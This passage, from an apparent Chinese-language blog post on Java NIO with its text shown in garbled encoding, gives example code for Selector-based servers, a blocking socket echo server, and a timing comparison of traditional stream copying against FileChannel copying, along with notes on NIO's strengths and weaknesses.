     keys.remove();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (key.isAcceptable()) &#123;  <span class="comment">// å¤„ç†è¿æ¥è¯·æ±‚</span></span><br><span class="line">                    <span class="type">ServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> server.accept();</span><br><span class="line">                    client.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                    client.register(selector, SelectionKey.OP_READ);  <span class="comment">// æ³¨å†Œè¯»äº‹ä»¶</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (key.isReadable()) &#123;  <span class="comment">// å¤„ç†è¯»è¯·æ±‚</span></span><br><span class="line">                    <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line">                    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">256</span>);</span><br><span class="line">                    client.read(buffer);</span><br><span class="line">                    System.out.println(<span class="string">&quot;Received message: &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(buffer.array()).trim());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼š</p><ul><li>åˆ›å»ºäº†ä¸€ä¸ª<code>Selector</code>ç”¨äºç®¡ç†å¤šä¸ªé€šé“ã€‚</li><li>é€šè¿‡<code>ServerSocketChannel</code>å»ºç«‹æœåŠ¡å™¨å¥—æ¥å­—ï¼Œå¹¶è®¾ç½®ä¸ºéé˜»å¡æ¨¡å¼ã€‚</li><li>å°†é€šé“æ³¨å†Œåˆ°é€‰æ‹©å™¨ä¸Šï¼Œç›‘å¬<code>OP_ACCEPT</code>ï¼ˆè¿æ¥è¯·æ±‚ï¼‰äº‹ä»¶ã€‚</li><li>é€‰æ‹©å™¨ç­‰å¾…äº‹ä»¶è§¦å‘ï¼Œé€šè¿‡è¿­ä»£å¤„ç†æ¯ä¸ªå°±ç»ªçš„<code>SelectionKey</code>ï¼Œå®ç°éé˜»å¡I&#x2F;Oã€‚</li></ul><h2 id="6-Java-NIOçš„ä¼˜ç¼ºç‚¹"><a href="#6-Java-NIOçš„ä¼˜ç¼ºç‚¹" class="headerlink" title="6. Java NIOçš„ä¼˜ç¼ºç‚¹"></a>6. <strong>Java NIOçš„ä¼˜ç¼ºç‚¹</strong></h2><p>ä¼ ç»Ÿ IO åŸºäºå­—èŠ‚æµæˆ–å­—ç¬¦æµï¼ˆå¦‚ FileInputStreamã€BufferedReader ç­‰ï¼‰è¿›è¡Œæ–‡ä»¶è¯»å†™ï¼Œä»¥åŠä½¿ç”¨ Socket å’Œ ServerSocket è¿›è¡Œç½‘ç»œä¼ è¾“ã€‚<br>NIO ä½¿ç”¨é€šé“ï¼ˆChannelï¼‰å’Œç¼“å†²åŒºï¼ˆBufferï¼‰è¿›è¡Œæ–‡ä»¶æ“ä½œï¼Œä»¥åŠä½¿ç”¨ SocketChannel å’Œ ServerSocketChannel è¿›è¡Œç½‘ç»œä¼ è¾“ã€‚<br>ä¼ ç»Ÿ IO é‡‡ç”¨é˜»å¡å¼æ¨¡å‹ï¼Œå¯¹äºæ¯ä¸ªè¿æ¥ï¼Œéƒ½éœ€è¦åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„çº¿ç¨‹æ¥å¤„ç†è¯»å†™æ“ä½œã€‚å½“ä¸€ä¸ªçº¿ç¨‹åœ¨ç­‰å¾… I&#x2F;O æ“ä½œæ—¶ï¼Œæ— æ³•æ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚è¿™ä¼šå¯¼è‡´å¤§é‡çº¿ç¨‹çš„åˆ›å»ºå’Œé”€æ¯ï¼Œä»¥åŠä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œé™ä½äº†ç³»ç»Ÿæ€§èƒ½ã€‚<br>NIO ä½¿ç”¨éé˜»å¡æ¨¡å‹ï¼Œå…è®¸çº¿ç¨‹åœ¨ç­‰å¾… I&#x2F;O æ—¶æ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚è¿™ç§æ¨¡å¼é€šè¿‡ä½¿ç”¨é€‰æ‹©å™¨ï¼ˆSelectorï¼‰æ¥ç›‘æ§å¤šä¸ªé€šé“ï¼ˆChannelï¼‰ä¸Šçš„ I&#x2F;O äº‹ä»¶ï¼Œå®ç°äº†æ›´é«˜çš„æ€§èƒ½å’Œå¯ä¼¸ç¼©æ€§ã€‚</p><p>ä»¥ä¸‹æ˜¯ NIO åœ¨ç½‘ç»œä¼ è¾“ä¸­ä¼˜äºä¼ ç»Ÿ I&#x2F;O çš„åŸå› ï¼š<br>â‘ ã€NIO æ”¯æŒéé˜»å¡ I&#x2F;Oï¼Œè¿™æ„å‘³ç€åœ¨æ‰§è¡Œ I&#x2F;O æ“ä½œæ—¶ï¼Œçº¿ç¨‹ä¸ä¼šè¢«é˜»å¡ã€‚è¿™ä½¿å¾—åœ¨ç½‘ç»œä¼ è¾“ä¸­å¯ä»¥æœ‰æ•ˆåœ°ç®¡ç†å¤§é‡å¹¶å‘è¿æ¥ï¼ˆæ•°åƒç”šè‡³æ•°ç™¾ä¸‡ï¼‰ã€‚è€Œåœ¨æ“ä½œæ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªä¼˜åŠ¿æ²¡æœ‰é‚£ä¹ˆæ˜æ˜¾ï¼Œå› ä¸ºæ–‡ä»¶è¯»å†™é€šå¸¸ä¸æ¶‰åŠå¤§é‡å¹¶å‘æ“ä½œã€‚<br>â‘¡ã€NIO æ”¯æŒ I&#x2F;O å¤šè·¯å¤ç”¨ï¼Œè¿™æ„å‘³ç€ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶ç›‘è§†å¤šä¸ªé€šé“ï¼ˆå¦‚å¥—æ¥å­—ï¼‰ï¼Œå¹¶åœ¨ I&#x2F;O äº‹ä»¶ï¼ˆå¦‚å¯è¯»ã€å¯å†™ï¼‰å‡†å¤‡å¥½æ—¶å¤„ç†å®ƒä»¬ã€‚è¿™å¤§å¤§æé«˜äº†ç½‘ç»œä¼ è¾“ä¸­çš„æ€§èƒ½ï¼Œå› ä¸ºå•ä¸ªçº¿ç¨‹å¯ä»¥é«˜æ•ˆåœ°ç®¡ç†å¤šä¸ªå¹¶å‘è¿æ¥ã€‚æ“ä½œæ–‡ä»¶æ—¶è¿™ä¸ªä¼˜åŠ¿ä¹Ÿæ— æ³•æç°å‡ºæ¥ã€‚<br>â‘¢ã€NIO æä¾›äº† ByteBuffer ç±»ï¼Œå¯ä»¥é«˜æ•ˆåœ°ç®¡ç†ç¼“å†²åŒºã€‚è¿™åœ¨ç½‘ç»œä¼ è¾“ä¸­å¾ˆé‡è¦ï¼Œå› ä¸ºæ•°æ®é€šå¸¸æ˜¯ä»¥å­—èŠ‚æµçš„å½¢å¼ä¼ è¾“ã€‚æ“ä½œæ–‡ä»¶çš„æ—¶å€™ï¼Œè™½ç„¶ä¹Ÿæœ‰ç¼“å†²åŒºï¼Œä½†ä¼˜åŠ¿ä»ç„¶ä¸å¤Ÿæ˜æ˜¾ã€‚</p><ul><li><p><strong>ä¼˜ç‚¹</strong>ï¼š</p><ul><li>é«˜æ€§èƒ½ï¼šæ”¯æŒéé˜»å¡I&#x2F;Oå’Œå¤šè·¯å¤ç”¨ï¼Œå¤§å¤§å‡å°‘äº†çº¿ç¨‹å¼€é”€å’Œé˜»å¡æ—¶é—´ã€‚</li><li>æ›´é€‚åˆç½‘ç»œç¼–ç¨‹ï¼šNIOçš„ç»“æ„é€‚åˆå¼€å‘é«˜å¹¶å‘çš„ç½‘ç»œåº”ç”¨ç¨‹åºï¼Œç‰¹åˆ«æ˜¯I&#x2F;Oå¯†é›†å‹æœåŠ¡ã€‚</li></ul></li><li><p><strong>ç¼ºç‚¹</strong>ï¼š</p><ul><li>å¼€å‘å¤æ‚åº¦é«˜ï¼šä¸ä¼ ç»ŸI&#x2F;Oç›¸æ¯”ï¼ŒNIOçš„ç¼–ç¨‹å¤æ‚åº¦æ›´é«˜ï¼Œéœ€è¦å¤„ç†é€‰æ‹©å™¨ã€ç¼“å†²åŒºç­‰ã€‚</li><li>é€‚ç”¨åœºæ™¯æœ‰é™ï¼šé€‚åˆI&#x2F;Oå¯†é›†å‹åº”ç”¨ï¼Œä½†å¯¹CPUå¯†é›†å‹åº”ç”¨çš„æ€§èƒ½æå‡æœ‰é™ã€‚</li></ul></li></ul><h3 id="NIO-å’Œä¼ ç»Ÿ-IO-åœ¨æ“ä½œæ–‡ä»¶æ—¶çš„å·®å¼‚"><a href="#NIO-å’Œä¼ ç»Ÿ-IO-åœ¨æ“ä½œæ–‡ä»¶æ—¶çš„å·®å¼‚" class="headerlink" title="NIO å’Œä¼ ç»Ÿ IO åœ¨æ“ä½œæ–‡ä»¶æ—¶çš„å·®å¼‚"></a>NIO å’Œä¼ ç»Ÿ IO åœ¨æ“ä½œæ–‡ä»¶æ—¶çš„å·®å¼‚</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.FileChannel;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ä¼ ç»Ÿ I/O æ–¹æ³•ä¼ è¾“æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="type">long</span> <span class="title function_">transferFile</span><span class="params">(File source, File des)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!des.exists())</span><br><span class="line">            des.createNewFile();</span><br><span class="line">        <span class="comment">// åˆ›å»ºè¾“å…¥è¾“å‡ºæµ</span></span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(source));</span><br><span class="line">        <span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(des));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ä½¿ç”¨æ•°ç»„ä¼ è¾“æ•°æ®</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> len;</span><br><span class="line">        <span class="keyword">while</span>((len = bis.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">            bos.write(bytes, <span class="number">0</span>,len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">return</span> endTime - startTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ NIO æ–¹å¼ä¼ è¾“æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> <span class="title function_">transferFileWithNIO</span><span class="params">(File source, File des)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!des.exists())</span><br><span class="line">            des.createNewFile();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºéšæœºå­˜å–æ–‡ä»¶å¯¹è±¡</span></span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">read</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(source, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">write</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(des, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºæ–‡ä»¶é€šé“</span></span><br><span class="line">        <span class="type">FileChannel</span> <span class="variable">readChannel</span> <span class="operator">=</span> read.getChannel();</span><br><span class="line">        <span class="type">FileChannel</span> <span class="variable">writeChannel</span> <span class="operator">=</span> write.getChannel();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ›å»ºå¹¶ä½¿ç”¨ByteBuffer ä¼ è¾“æ•°æ®</span></span><br><span class="line">        <span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span> * <span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">while</span>(readChannel.read(byteBuffer) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            byteBuffer.flip();</span><br><span class="line">            writeChannel.write(byteBuffer);</span><br><span class="line">            byteBuffer.clear();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å…³é—­æ–‡ä»¶é€šé“</span></span><br><span class="line">        writeChannel.close();;</span><br><span class="line">        readChannel.close();</span><br><span class="line">        <span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="keyword">return</span> endTime - startTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Main</span> <span class="variable">transferfile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Main</span>();</span><br><span class="line">        <span class="type">File</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/home/dell/ä¸‹è½½/Clash.for.Windows-0.20.35-win.7z&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">des</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;a.7z&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">nio</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;b.7z&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¯”è¾ƒæ—¶é—´</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> transferfile.transferFile(source, des);</span><br><span class="line">        System.out.println(time + <span class="string">&quot;æ™®é€šå­—èŠ‚æµæ—¶é—´&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">timeNio</span> <span class="operator">=</span> transferfile.transferFileWithNIO(source, nio);</span><br><span class="line">        System.out.println(timeNio + <span class="string">&quot;NIOæ—¶é—´&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š<br><img src="/2024/11/04/code/javanio/image-1.png"><br>æ–‡ä»¶è¶Šå¤§çš„æƒ…å†µä¸‹ï¼Œç«Ÿç„¶æ™®é€šå­—èŠ‚æµï¼ˆä¼ ç»Ÿ IOï¼‰çš„é€Ÿåº¦æ›´å¿«,NIOçš„é­…åŠ›ä¸»è¦æ˜¯åœ¨ç½‘ç»œå½“ä¸­</p><h3 id="NIO-å’Œä¼ ç»Ÿ-IO-åœ¨ç½‘ç»œä¼ è¾“ä¸­çš„å·®å¼‚"><a href="#NIO-å’Œä¼ ç»Ÿ-IO-åœ¨ç½‘ç»œä¼ è¾“ä¸­çš„å·®å¼‚" class="headerlink" title="NIO å’Œä¼ ç»Ÿ IO åœ¨ç½‘ç»œä¼ è¾“ä¸­çš„å·®å¼‚"></a>NIO å’Œä¼ ç»Ÿ IO åœ¨ç½‘ç»œä¼ è¾“ä¸­çš„å·®å¼‚</h3><p>IOï¼Œç”¨çš„å¥—æ¥å­—ï¼Œå…¶ä¸­<br>Socket å’Œ ServerSocket æ˜¯ä¼ ç»Ÿçš„é˜»å¡å¼ I&#x2F;O ç¼–ç¨‹æ–¹å¼ï¼Œç”¨äºå»ºç«‹å’Œç®¡ç† TCP è¿æ¥ã€‚<br>Socketï¼šè¡¨ç¤ºå®¢æˆ·ç«¯å¥—æ¥å­—ï¼Œè´Ÿè´£ä¸æœåŠ¡å™¨ç«¯å»ºç«‹è¿æ¥å¹¶è¿›è¡Œæ•°æ®çš„è¯»å†™ã€‚<br>ServerSocketï¼šè¡¨ç¤ºæœåŠ¡å™¨ç«¯å¥—æ¥å­—ï¼Œè´Ÿè´£ç›‘å¬å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚ã€‚å½“æœ‰æ–°çš„è¿æ¥è¯·æ±‚æ—¶ï¼ŒServerSocket ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ Socket å®ä¾‹ï¼Œç”¨äºä¸å®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ã€‚<br>åœ¨ä¼ ç»Ÿé˜»å¡å¼ I&#x2F;O ç¼–ç¨‹ä¸­ï¼Œæ¯ä¸ªè¿æ¥éƒ½éœ€è¦ä¸€ä¸ªå•ç‹¬çš„çº¿ç¨‹è¿›è¡Œå¤„ç†ï¼Œè¿™å¯¼è‡´äº†åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹çš„æ€§èƒ½é—®é¢˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IOSever</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ServerSocket</span> <span class="variable">serverSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(<span class="number">8080</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="type">Socket</span> <span class="variable">client</span> <span class="operator">=</span> serverSocket.accept();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> client.getInputStream();</span><br><span class="line">                <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> client.getOutputStream();</span><br><span class="line">                </span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> in.read(buffer);</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                </span><br><span class="line">                in.close();</span><br><span class="line">                out.close();</span><br><span class="line">                client.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NIOï¼Œä¸ºäº†è§£å†³ä¼ ç»Ÿé˜»å¡å¼ I&#x2F;O çš„æ€§èƒ½é—®é¢˜ï¼ŒJava NIO å¼•å…¥äº† ServerSocketChannel å’Œ SocketChannelã€‚å®ƒä»¬æ˜¯éé˜»å¡ I&#x2F;Oï¼Œå¯ä»¥åœ¨å•ä¸ªçº¿ç¨‹ä¸­å¤„ç†å¤šä¸ªè¿æ¥ã€‚<br>ServerSocketChannelï¼šç±»ä¼¼äº ServerSocketï¼Œè¡¨ç¤ºæœåŠ¡å™¨ç«¯å¥—æ¥å­—é€šé“ã€‚å®ƒè´Ÿè´£ç›‘å¬å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚ï¼Œå¹¶å¯ä»¥è®¾ç½®ä¸ºéé˜»å¡æ¨¡å¼ï¼Œè¿™æ„å‘³ç€åœ¨ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚æ—¶ä¸ä¼šé˜»å¡çº¿ç¨‹ã€‚<br>SocketChannelï¼šç±»ä¼¼äº Socketï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯å¥—æ¥å­—é€šé“ã€‚å®ƒè´Ÿè´£ä¸æœåŠ¡å™¨ç«¯å»ºç«‹è¿æ¥å¹¶è¿›è¡Œæ•°æ®çš„è¯»å†™ã€‚SocketChannel ä¹Ÿå¯ä»¥è®¾ç½®ä¸ºéé˜»å¡æ¨¡å¼ï¼Œåœ¨è¯»å†™æ•°æ®æ—¶ä¸ä¼šé˜»å¡çº¿ç¨‹ã€‚</p><p>Selector æ˜¯ Java NIO ä¸­çš„ä¸€ä¸ªå…³é”®ç»„ä»¶ï¼Œç”¨äºå®ç° I&#x2F;O å¤šè·¯å¤ç”¨ã€‚å®ƒå…è®¸åœ¨å•ä¸ªçº¿ç¨‹ä¸­åŒæ—¶ç›‘æ§å¤šä¸ª ServerSocketChannel å’Œ SocketChannelï¼Œå¹¶é€šè¿‡ SelectionKey æ ‡è¯†å…³æ³¨çš„äº‹ä»¶ã€‚å½“æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶ï¼ŒSelector ä¼šå°†å¯¹åº”çš„ SelectionKey æ·»åŠ åˆ°å·²é€‰æ‹©çš„é”®é›†åˆä¸­ã€‚é€šè¿‡ä½¿ç”¨ Selectorï¼Œå¯ä»¥åœ¨å•ä¸ªçº¿ç¨‹ä¸­åŒæ—¶å¤„ç†å¤šä¸ªè¿æ¥ï¼Œä»è€Œæœ‰æ•ˆåœ°æé«˜ I&#x2F;O æ“ä½œçš„æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NIOServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// åˆ›å»ºServerSocketChannel</span></span><br><span class="line">            <span class="type">ServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> ServerSocketChannel.open();</span><br><span class="line">            <span class="comment">// ç»‘å®šç«¯å£</span></span><br><span class="line">            serverSocketChannel.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">8081</span>));</span><br><span class="line">            <span class="comment">// è®¾ç½®ä¸ºéé˜»å¡æ¨¡å¼</span></span><br><span class="line">            serverSocketChannel.configureBlocking(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// åˆ›å»º Selector</span></span><br><span class="line">            <span class="type">Selector</span> <span class="variable">selector</span> <span class="operator">=</span> Selector.open();</span><br><span class="line">            <span class="comment">// å°†ServerSocketChannel æ³¨å†Œåˆ° Selector ,å…³æ³¨ OP_ACCEPT äº‹ä»¶</span></span><br><span class="line">            serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ— é™å¾ªç¯ï¼Œå¤„ç†äº‹ä»¶</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                <span class="comment">// é˜»å¡ç›´åˆ°æœ‰äº‹ä»¶å‘ç”Ÿ</span></span><br><span class="line">                selector.select();</span><br><span class="line">                <span class="comment">// è·å–å‘ç”Ÿäº‹ä»¶çš„ SelectionKey</span></span><br><span class="line">                Iterator&lt;SelectionKey&gt; iterator = selector.selectedKeys().iterator();</span><br><span class="line">                <span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">                    <span class="type">SelectionKey</span> <span class="variable">key</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">                    <span class="comment">// å¤„ç†å®Œæˆåï¼Œä»selectdKeysé›†åˆä¸­åˆ é™¤</span></span><br><span class="line">                    iterator.remove();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// åˆ¤æ–­äº‹ä»¶ç±»å‹</span></span><br><span class="line">                    <span class="keyword">if</span>(key.isAcceptable())&#123;</span><br><span class="line">                        <span class="comment">// æœ‰æ–°çš„è¿æ¥è¯·æ±‚</span></span><br><span class="line">                        <span class="type">ServerSocketChannel</span> <span class="variable">server</span> <span class="operator">=</span> (ServerSocketChannel) key.channel();</span><br><span class="line">                        <span class="comment">// æ¥å—è¿æ¥</span></span><br><span class="line">                        <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> server.accept();</span><br><span class="line">                        <span class="comment">// è®¾ç½®ä¸ºéé˜»å¡æ¨¡å¼</span></span><br><span class="line">                        client.configureBlocking(<span class="literal">false</span>);</span><br><span class="line">                        <span class="comment">// å°†æ–°çš„SocketChannel æ³¨å†Œåˆ°Selectorï¼Œå…³æ³¨ OP_READäº‹ä»¶</span></span><br><span class="line">                        client.register(selector, SelectionKey.OP_READ);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(key.isReadable())&#123;</span><br><span class="line">                        <span class="comment">// æœ‰æ•°æ®å¯è¯»</span></span><br><span class="line">                        <span class="type">SocketChannel</span> <span class="variable">client</span> <span class="operator">=</span> (SocketChannel) key.channel();</span><br><span class="line">                        <span class="comment">// åˆ›å»º ByteBuffer ç¼“å†²åŒº</span></span><br><span class="line">                        <span class="type">ByteBuffer</span> <span 